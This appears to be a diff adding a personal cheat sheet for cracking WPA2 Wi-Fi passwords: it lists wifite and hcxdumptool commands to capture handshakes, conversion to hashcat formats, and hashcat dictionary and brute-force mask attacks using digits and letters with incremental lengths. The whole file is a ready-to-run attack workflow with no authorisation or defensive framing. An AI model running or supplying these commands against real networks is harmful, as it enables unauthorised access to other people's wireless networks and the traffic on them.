@@ -1,0 +1,78 @@
+192.168.0.1
+sudo wifite
+sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt --kill
+
+// first capture the handshake
+sudo /usr/share/hashcat-utils/cap2hccapx.bin <file name> wpa2.hccapx
+
+// copy this file to window
+// now inside the hashcat folder open terminal cmd
+hashcat.exe -I
+hashcat.exe -m 2500 -a 3 wp2.hccapx ?d?d?d?d?d?d?d?d
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// COMMANDS //
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+
+sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15 
+
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+
+// convert .pcapng file to .hc22000 file
+hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+
+// to get the bssid
+sudo hcxdumptool --do_rescan -i wlan0
+
+//use the bssid to filter out which one to crack
+//then in kali move .hc22000 file to a backup file
+mv hash.hc22000 hash.hc22000.bk
+
+// create a new .hc22000 file with the same name and paste the filtered content here
+nano hash.hc22000 
+
+//then on the .hc22000 file, either use wordlist or bruteforce with hashcat
+hashcat -m 22000 hash.hc22000 wordlist.txt
+
+Windows:
+hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// COMMANDS //
+Check GPU:
+hashcat.exe -I
+
+10 digits (Old Method):
+hashcat.exe -m 2500 -a 3 10digit.hccapx ?d?d?d?d?d?d?d?d?d?d
+
+Increment WPA2 digits (Old Method):
+hashcat.exe -m 2500 -a 3 10digit.hccapx --increment --increment-min 8 --increment-max 20 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
+
+8 digits (New Method):
+hashcat.exe -m 22000 8-digit-wpa2.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+10 digits (New Method):
+hashcat.exe -m 22000 10-digit-wpa2.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d
+
+10 digits and alpha (New Method):
+hashcat.exe -m 22000 10-digit-letters-wpa2.hc22000 -1 ?d?l?u -a 3 ?1?1?1?1?1?1?1?1?1?1
+
+Increment digits (New Method):
+hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
+
+Increment digits and alpha (New Method):
+hashcat.exe -m 22000 10-digit-letters-wpa2.hc22000 -1 ?d?l?u -a 3 --increment --increment-min 8 --increment-max 12 ?1?1?1?1?1?1?1?1?1?1?1?1
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+?l lower case
+?u uppercase
+?d digits
+?s special characters
+?a everything above
